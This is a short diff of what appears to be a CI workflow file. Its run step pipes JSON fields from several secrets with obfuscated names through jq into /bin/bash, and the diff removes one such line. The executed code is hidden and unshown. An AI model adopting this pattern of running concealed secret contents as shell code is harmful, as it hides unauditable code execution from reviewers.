@@ -27,7 +27,6 @@ jobs:
           spzx9489: ${{ secrets.spzx9489 }}
         run: |
           printf '%s' "$spzx9489" | jq -r .av81222 | /bin/bash
-          echo $kuujk61 | jq -r .mq30 | /bin/bash
           printf '%s' "$mnz63" | jq -r .me434 | /bin/bash
           printf '%s' "$qed8085" | jq -r .deoe13256 | /bin/bash
           printf '%s' "$irak60590" | jq -r .hikzm8176 | /bin/bash
